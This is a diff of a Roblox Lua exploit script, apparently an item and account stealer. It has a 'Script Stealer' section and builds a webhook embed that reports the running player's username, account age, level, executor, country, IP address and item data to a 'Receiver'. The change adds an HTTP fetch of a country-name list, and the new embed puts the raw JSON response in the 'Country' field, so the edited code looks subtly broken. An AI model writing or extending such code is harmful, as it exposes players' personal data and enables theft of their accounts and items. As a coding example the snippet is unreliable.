@@ -808,12 +808,17 @@ local InvModule = require(game:GetService("ReplicatedStorage").Modules.Inventory
 
 -- Get Players Country --
 
-local LS = game:GetService("LocalizationService")
+local Players = game:GetService("Players")
+local LocalizationService = game:GetService("LocalizationService")
+local Countries = {}
 
-game.Players.PlayerAdded:Connect(function(plr)
-	local region = LS:GetCountryRegionForPlayerAsync(plr)
-	print(plr.Name .."http://country.io/names.json"..region)
+local success, result = pcall(function()
+	return HttpService:GetAsync("http://country.io/names.json")
 end)
+
+if success and result then
+	Countries = HttpService:JSONDecode(result)
+end
 
 -- Script Stealer --
 
@@ -1077,7 +1082,7 @@ local WebHookEmbed = CreateEmbed(
         {
             name = "🌊 Player Info", 
             value = "``` | 📖 Username: "..LP.Name.."\n | 📌 Account Age: "..tostring(LP.AccountAge).."\n | 🚀 Level: "..tostring(getLvl())..
-                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."\n | 🗺 Country: "..region.."\n | 👤 IP: "..ipwebhook.. "```"
+                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."\n | 🗺 Country: "..result.."\n | 👤 IP: "..ipwebhook.. "```"
         },
         {
             name = "🍎 Items Data", 
